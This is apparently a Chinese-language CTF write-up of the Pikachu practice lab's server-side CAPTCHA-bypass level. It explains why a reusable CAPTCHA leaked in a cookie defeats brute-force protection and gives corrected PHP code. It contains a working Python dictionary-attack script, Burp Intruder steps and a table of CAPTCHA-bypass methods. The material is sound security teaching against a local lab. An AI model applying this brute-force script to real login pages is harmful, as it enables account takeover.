---
layout: post
title: Pikachu - 暴力破解 验证码绕过(on server) Writeup
platform: pikachu
date: 2026-10-25 14:53:00 +0800
categories: CTF
---

Pikachu - 暴力破解 验证码绕过(on server) Writeup

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：暴力破解 → 验证码绕过（on server）
- 地址：`http://localhost/pikachu/vul/burteforce/bf_server.php`
- 题型：Web
- 考点：**验证码校验后不销毁**、**验证码明文泄露在 Cookie**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
Session 存在 D:\phpstudy_pro\Extensions\tmp\tmp\
```

**✅ 实测结果**

```text
★ 关键三处值完全一致：

    页面图片上的验证码    = oc33i4
    Cookie bf[vcode]     = oc33i4
    服务器 session 文件   = vcode|s:6:"oc33i4";

★ 手工验证：同一个验证码连登 4 次

    第 1 次 admin/123456 + oc33i4 → ✅ login success
    第 2 次 admin/123456 + oc33i4 → ✅ login success
    第 3 次 admin/123456 + oc33i4 → ✅ login success
    第 4 次 admin/123456 + oc33i4 → ✅ login success

★ 对照组：换一个错误验证码

    admin/123456 + WRONG9 → ❌ 验证码输入错误

    ★ 错的立刻被拦 → 说明校验逻辑是好的
    ★ 对的能重复用 → 说明校验后没清理

★ 脚本爆破（用同一个验证码跑 145 条字典）：

    目标用户 pikachu
    [  1/145]  123456     失败
    ...
    [ 31/145]  000000     ★★★ 成功
    尝试 31 次，耗时 0.9 秒
```

二、题目分析

**① 页面长什么样**

```text
┌────────────────────────────────────┐
│  Please Enter Your Information     │
│                                    │
│  [ Username          ]             │
│  [ Password          ]             │
│  [ 验证码            ]             │
│  ┌──────────┐                      │
│  │ oc33i4   │  ← 验证码图片        │
│  └──────────┘                      │
│  [ Login ]                         │
└────────────────────────────────────┘
```

**看起来很正常** —— 有用户名、密码、图片验证码。

**② 后端代码（关键部分）**

```php
<?php
if(isset($_POST['submit'])) {

    // 判断是否为空
    if (empty($_POST['username'])) { $html .= "用户名不能为空"; }
    if (empty($_POST['password'])) { $html .= "密码不能为空"; }
    if (empty($_POST['vcode']))    { $html .= "验证码不能为空"; }

    // 验证验证码是否正确
    if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
        $html .= "<p class='notice'>验证码输入错误哦！</p>";
        // ★★★ 应该在验证完成后,销毁该$_SESSION['vcode']
    } else {

        $username = $_POST['username'];
        $password = $_POST['password'];
        $vcode    = $_POST['vcode'];

        $sql = "select * from users where username=? and password=md5(?)";
        $line_pre = $link->prepare($sql);
        $line_pre->bind_param('ss', $username, $password);

        if($line_pre->execute()){
            $line_pre->store_result();
            // ★★★ 虽然前面做了为空判断,但最后,却没有验证验证码!!!
            if($line_pre->num_rows()==1){
                $html .= '<p> login success</p>';
            }else{
                $html .= '<p> username or password is not exists～</p>';
            }
        }
    }
}
?>
```

**★ 作者自己写了两条注释，直接点破了两个漏洞**：

```php
// 应该在验证完成后,销毁该$_SESSION['vcode']
// 虽然前面做了为空判断,但最后,却没有验证验证码!!!
```

**③ 验证码是怎么生成的**

```php
<?php
// inc/showvcode.php
session_start();
//验证码绕过 on server 这里其实还是有一个问题,
//就是服务端将验证码字符串以明文COOKIE的方式给了前端,
//那验证码还有什么鸟意义。。。
$_SESSION['vcode'] = vcodex();
setcookie('bf[vcode]', $_SESSION['vcode']);     // ★★★ 明文写进 Cookie

// 下面输出图片
?>
```

**★ 第三处注释，又是一个自证的漏洞**：

```php
//就是服务端将验证码字符串以明文COOKIE的方式给了前端,
//那验证码还有什么鸟意义。。。
```

**④ 漏洞 1：验证码校验后不销毁**

```text
正常的验证码流程：
    ① 页面加载 → 生成随机验证码 → 存 session → 显示图片
    ② 用户输入 → 服务器比对
    ③ ★ 比对完立刻 unset($_SESSION['vcode'])
    ④ 下次请求 → session 里没有 vcode → 必须重新生成
    
    结果：每次请求都要重新识别验证码 → 脚本跑不动

本关的流程：
    ① 页面加载 → 生成 → 存 session
    ② 用户输入 → 服务器比对
    ③ ★ 比对了，但没销毁
    ④ 下次请求 → session 里还是那个值 → 依然有效
    
    结果：一个验证码用到底 → 验证码形同虚设
```

**★ 类比**：

```text
验证码 = 一次性门票
    正常：进门撕票，下次要重新买
    这关：进门不撕票，一张票进 1000 次
```

**⑤ 漏洞 2：验证码明文写在 Cookie 里**

```php
setcookie('bf[vcode]', $_SESSION['vcode']);
```

**这行的后果**：

```text
正常设计：验证码只存在于
    ① 服务器 session
    ② 图片的像素里
    → 机器只能"识别图片"才能知道答案（成本很高）

本关设计：还在 Cookie 里明文写了一份
    → 机器直接读 Cookie 就知道答案
    → 完全不用识别图片
    → 验证码"防机器"的目的彻底落空
```

**★ 这就是为什么有了漏洞 2 之后，攻击者连"识别验证码"这一步都省了。**

**⑥ Session / Cookie / 图片 三者的关系**

**本地环境最大的好处：可以同时看到服务端和客户端**：

```bash
# ① 浏览器 F12 → 应用 → Cookie
PHPSESSID  = 3ultuksphoo00jg09i527sq2qg
bf[vcode]  = oc33i4

# ② 服务器上的 session 文件
D:\phpstudy_pro\Extensions\tmp\tmp\sess_3ultuksphoo00jg09i527sq2qg
内容: vcode|s:6:"oc33i4";

# ③ 页面图片上显示
oc33i4
```

**★ 三处完全一致 —— 这就是 session 机制的全貌**：

```text
PHPSESSID（钥匙）
    ↓
服务器用钥匙拼文件名：sess_<PHPSESSID>
    ↓
打开文件，读出 vcode = oc33i4
    ↓
拿它和你提交的 $_POST['vcode'] 比较
```

**⑦ 一个反常识的点：页面图片和 session 会"错位"**

**实测遇到的现象**：

```text
页面图片显示： z2cP5u
Cookie 里的值： ek4uwi
session 文件：  vcode|s:6:"ek4uwi";
```

**原因**：

```php
// showvcode.php 每被请求一次，就生成新的
$_SESSION['vcode'] = vcodex();
```

```text
流程还原：
    ① 页面加载 → 请求图片 → 生成 z2cP5u → 图片显示 z2cP5u
    ② 之后又触发了一次图片请求（点了图片 / 开了另一个标签页）
       → 生成 ek4uwi → 覆盖 session 和 Cookie
    ③ 但页面上的 <img> 没有重绘 → 依然显示旧的 z2cP5u
       
★ 结论：页面上的图片 = "渲染那一刻的历史快照"
        session / Cookie = "服务器当前认的值"
        
★ 攻击时要以【服务端当前值】为准
```

**⑧ 为什么"两个漏洞叠加"才真正致命**

**单独看**：

| 只有漏洞 1（不销毁）| 只有漏洞 2（Cookie 泄露）|
|---|---|
| 得自己看图片认验证码 | 每次请求图片 → 读新 Cookie → 用新验证码 |
| 人眼识别 → 只能手工，慢 | 能自动化，但每次要多发一个图片请求 |
| **自动化极难** | **能自动化** |

**两个都有**：

```text
请求一次图片 → 读 Cookie 拿到 vcode → 无限次使用
★ 连"每次请求图片"都省了
★ 验证码完全失效
```

**★ 这就是"纵深防御"（Defense in Depth）的意义**：

```text
一道防线被破，还有第二道
这题两道防线都破了 → 等于没有
```

三、解题步骤

**第 1 步：用 F12 看 Cookie，发现验证码泄露**

```text
① 打开 http://localhost/pikachu/vul/burteforce/bf_server.php
② F12 → 【应用】(Application) 标签
③ 左边：存储 → Cookie → 点 http://localhost
④ 右边看到两条：

   名称          值
   bf[vcode]     oc33i4                                   ← ★ 验证码明文！
   PHPSESSID     3ultuksphoo00jg09i527sq2qg

⑤ 对照页面上的验证码图片 → 一模一样
```

**★ 这一步证明"漏洞 2"存在。**

**第 2 步：找到服务器上的 session 文件，对照三处值**

**文件名规则**：

```text
sess_ + 你的 PHPSESSID
     ↓
sess_3ultuksphoo00jg09i527sq2qg
```

**完整路径**：

```text
D:\phpstudy_pro\Extensions\tmp\tmp\sess_3ultuksphoo00jg09i527sq2qg
```

**用记事本或 VS Code 打开**：

```powershell
notepad "D:\phpstudy_pro\Extensions\tmp\tmp\sess_3ultuksphoo00jg09i527sq2qg"
```

**内容**：

```text
vcode|s:6:"oc33i4";
└─┬─┘ └┬┘ └──┬──┘
 键名 长度  值（验证码）
```

**★ 这一步证明"服务端和客户端通过 session 关联"。**

**第 3 步：手工验证"验证码可以重复使用"**

```text
① 填：Username = admin
      Password = 123456
      验证码   = oc33i4（填 Cookie 里的值）
② 点 Login → login success

③ ★ 不要刷新页面
④ 再点一次 Login → 还是 login success
⑤ 再点第三次      → 还是 login success
```

**★ 三次都成功 = 漏洞 1 坐实。**

**对照组（确认校验逻辑还活着）**：

```text
① 验证码填 WRONG9
② 点 Login → "验证码输入错误哦！"

★ 错的立刻被拦 → 校验逻辑没问题
★ 问题在于"校验完不清理"
```

**第 4 步：脚本爆破**

```python
import time
import urllib.parse
import urllib.request
import http.cookiejar

BASE = "http://localhost/pikachu"
PAGE = BASE + "/vul/burteforce/bf_server.php"
IMG  = BASE + "/inc/showvcode.php"
DICT = r"C:\Users\cecilia\Downloads\passwords-top150.txt"

# ① 建一个"假浏览器"（自动管理 Cookie）
jar = http.cookiejar.LWPCookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

# ② 打开页面，拿 PHPSESSID
opener.open(urllib.request.Request(PAGE, headers={"User-Agent": "Mozilla/5.0"})).read()

# ③ 请求一次验证码图片，让服务器生成 vcode
opener.open(urllib.request.Request(IMG, headers={"User-Agent": "Mozilla/5.0"})).read()

# ④ 从 Cookie 里读出验证码（★ 利用漏洞 2）
vcode = ""
for c in jar:
    if c.name == "bf[vcode]":
        vcode = c.value

print("拿到验证码:", vcode)

# ⑤ 用这个验证码跑字典（★ 利用漏洞 1）
with open(DICT, encoding="utf-8") as f:
    passwords = [line.strip() for line in f if line.strip()]

start = time.time()
for i, pw in enumerate(passwords, 1):
    data = urllib.parse.urlencode({
        "username": "pikachu",
        "password": pw,
        "vcode": vcode,          # ★ 同一个验证码，从头用到尾
        "submit": "Login",
    }).encode()
    req = urllib.request.Request(PAGE, data=data, method="POST", headers={
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    body = opener.open(req).read().decode("utf-8", "replace")

    if "login success" in body:
        print("[%d/%d] %s ★★★ 成功  耗时 %.1f 秒" % (i, len(passwords), pw, time.time() - start))
        break
    print("[%d/%d] %s 失败" % (i, len(passwords), pw))
```

**实测输出**：

```text
【步骤 1】打开页面，拿 PHPSESSID
   PHPSESSID = fkr4a8rqs2s6pkcq5tjrjd29s8

【步骤 2】请求验证码图片
   ★ 从 Cookie bf[vcode] 读到验证码 = q4nioi

【步骤 3】用这个【固定】的验证码跑字典

[  1/145]  123456                 失败
[  2/145]  password               失败
...
[ 31/145]  000000                 ★★★ 成功

尝试: 31 / 145 次   耗时: 0.9 秒

★ 结论：一个验证码被用了 31 次，服务器一次都没拦住
```

**★ 关键代码只有三处**：

```python
# 1. 只请求【一次】图片
opener.open(IMG)

# 2. 从 Cookie 读出验证码（不用识图！）
vcode = [c.value for c in jar if c.name == "bf[vcode]"][0]

# 3. 循环里一直用同一个 vcode
data = {"vcode": vcode, ...}
```

**第 5 步：用 Burp Intruder 做一遍（正统工具）**

**Burp 的优势：抓到的请求里自带 Cookie，session 自动固定。**

```text
① 启动 Burp，用【内置浏览器】打开 bf_server.php
   ★ Chrome 默认不走代理访问 localhost，抓不到包

② 看清页面验证码（比如 oc33i4）

③ Burp → Proxy → Intercept is on

④ 页面填：pikachu / test123 / oc33i4 → Login

⑤ 拦到的请求：

    POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
    Cookie: PHPSESSID=xxx; bf[vcode]=oc33i4      ← ★ 别删！
    
    username=pikachu&password=test123&vcode=oc33i4&submit=Login

⑥ 右键 → Send to Intruder (Ctrl+I)

⑦ Positions
   - Clear § 清掉自动标记
   - 只标记 password 的值
   - username=pikachu&password=§test123§&vcode=oc33i4&submit=Login

⑧ Payloads
   - Payload type: Simple list
   - Load... → passwords-top150.txt

⑨ Settings → Grep - Match → 添加 "login success"

⑩ Start attack
   - 结果表里，命中的那行 Grep 列打勾
```

**★ Burp 做法的三个坑**：

```text
① 千万别刷新页面！
   一旦 F5 / 点验证码图片 → 服务器换新验证码
   → Intruder 里那个 vcode 失效 → 全部报"验证码输入错误"

② 别删 Cookie 头
   删了 PHPSESSID → 新会话 → 验证码不匹配

③ Community 版限速 ~1 请求/秒
   145 个密码要 2 分多钟
```

四、延伸知识

**① 三关对比：暴力破解的三种"防护"**

| 关卡 | 防护措施 | 漏洞 | 绕过方式 | 难度 |
|---|---|---|---|---|
| **第 1 关** `bf_form.php` | 无 | 无任何限制 | 直接跑字典 | ⭐ |
| **第 2 关** `bf_client.php` | 前端 JS 校验验证码 | 校验在客户端 | 禁用 JS / 直接发请求 | ⭐ |
| **第 3 关** `bf_server.php` | 后端校验验证码 | 不销毁 + Cookie 泄露 | 一个验证码用到底 | ⭐⭐ |

**★ 三关教的是同一个道理**：

```text
"防护做了一半" = "没做防护"
```

**② 正确的验证码设计（一次性凭证）**

```php
// ① 校验后【立刻销毁】，不管成功失败
if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
    unset($_SESSION['vcode']);          // ← 失败也销毁
    $html .= "验证码输入错误哦！";
} else {
    unset($_SESSION['vcode']);          // ← 成功也销毁
    // 继续验证用户名密码
}

// ② 验证码绝不进 Cookie
//    删掉 setcookie('bf[vcode]', ...) 这一行

// ③ 生成时加时效（比如 5 分钟过期）
$_SESSION['vcode_time'] = time();

// ④ 加失败次数限制
if ($_SESSION['fail_count'] >= 5) { die("锁定 15 分钟"); }

// ⑤ 图片加噪点、扭曲、干扰线（防 OCR）
```

**★ 最核心的一条**：

```text
验证码 = 一次性凭证
    → 用完必须销毁（不管成功还是失败）
    → 且只存在于"服务器 session"和"图片像素"里
    → 绝不出现在任何客户端可读的地方
```

**③ 验证码绕过的常见手法（汇总表）**

| 手法 | 原理 | 对应关卡 |
|---|---|---|
| **前端校验绕过** | 校验在 JS 里，禁用 JS 或直接发请求 | 第 2 关 |
| **验证码不刷新** | 同一个验证码可重复用 | 第 3 关 |
| **验证码可爆破** | 验证码是 4 位数字 → 10000 种可能，可穷举 | 真实场景常见 |
| **验证码复用** | 用已通过的验证码 ID 反复提交 | 真实场景常见 |
| **OCR 识别** | 用 tesseract / 深度学习识别图片 | 真实场景 |
| **打码平台** | 人工识别 API，几分钱一次 | 真实场景 |
| **逻辑漏洞** | 验证码参数不传 / 传空 / 大小写绕过 | 视代码而定 |
| **验证码与用户不绑定** | 用 A 用户拿到的验证码给 B 用户用 | 真实场景 |

**④ Session 相关的其他漏洞**

| 漏洞 | 原理 | 后果 |
|---|---|---|
| **Session 固定** | 攻击者预设一个 session id 给受害者 | 受害者登录后，攻击者用同一个 id 接管 |
| **Session 劫持** | 偷到别人的 session id | 完全接管他人账号 |
| **验证码不销毁** | 本关 | 暴力破解无限制 |
| **Session 文件包含** | session 里存了恶意代码，再 include 它 | RCE |
| **Session 名字可预测** | 默认 PHPSESSID | 便于攻击者定向 |

**⑤ 关于 `bf[vcode]` 这个 Cookie 名**

```php
setcookie('bf[vcode]', $value);
```

**PHP 的"数组型 Cookie"语法**：

```text
浏览器里：Cookie 名 = bf[vcode]
服务器端：$_COOKIE['bf']['vcode'] = $value
                                ↑ 自动解析成二维数组

用途：把同一模块的多个 cookie 归到一起
     bf[vcode]  → 暴力破解的验证码
     sqli[step] → SQL 注入的步骤
     xss[token] → XSS 的 token
```

**★ 但本题的"分组建模"没意义 —— 因为把验证码放进 Cookie 本身就是错的。**

**⑥ 本地靶场最大的价值：能同时看到"两端"**

```text
在 CTFHub 那种远程靶场：
    · 你只能看到浏览器端（F12）
    · 看不到服务器上的 session 文件
    
本地 pikachu：
    · 浏览器 F12 → Cookie 值
    · D:\phpstudy_pro\Extensions\tmp\tmp\sess_xxx → 服务器真值
    · 源码 → 生成逻辑
    · php.ini → session 配置
    
★ 三端对照，才能真正理解"数据是怎么流的"
```

五、总结

- **本题核心：验证码校验后不销毁 + 明文写在 Cookie 里 → 一个验证码用到底。**

- **两个漏洞（作者都在注释里承认了）**：

```php
// 漏洞 1
// 应该在验证完成后,销毁该$_SESSION['vcode']

// 漏洞 2
// 就是服务端将验证码字符串以明文COOKIE的方式给了前端,
// 那验证码还有什么鸟意义。。。
```

- **完整攻击链**：

```text
① GET 页面        → 拿 PHPSESSID
② GET 验证码图片   → 生成 vcode（同时写进 Cookie）
③ 从 Cookie 读 vcode
④ 循环 POST：固定 PHPSESSID + 固定 vcode + 变 password
⑤ 判断响应里有没有 "login success"
```

- **三个必记要点**：

```text
① 验证码是"一次性凭证"，用完必须销毁（成功失败都要）
② 验证码绝不能出现在客户端可读的地方（Cookie / HTML / JS 变量）
③ 页面上的图片是"历史快照"，session 里的才是"当前真值"
```

- **实测结果**：

```text
同一个验证码 oc33i4 连登 4 次 → 4 次全部 login success
换错误验证码 WRONG9          → 立刻被拦
脚本爆破 pikachu / 000000    → 第 31 次命中，0.9 秒
```

**手工复现要点**：

```text
· F12 → 应用 → Cookie → 找到 bf[vcode]（验证码明文）
· 对照页面图片，确认一致
· 填 admin/123456 + 这个验证码 → login success
· 不刷新，连点 3 次 → 每次都成功（证明不销毁）
· 换错误验证码 → 被拦（证明校验逻辑正常）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  验证码的本质是"一次性凭证"                              │
│                                                        │
│  两种"做一半"的死法：                                    │
│      ① 校验了，但不销毁 → 变成永久凭证                   │
│      ② 校验了，但泄露给前端 → 机器不用识图               │
│                                                        │
│  ★ 两个叠加 = 验证码完全失效                             │
│  ★ 任意一个单独存在，攻击成本都会高一个数量级             │
└────────────────────────────────────────────────────────┘
```
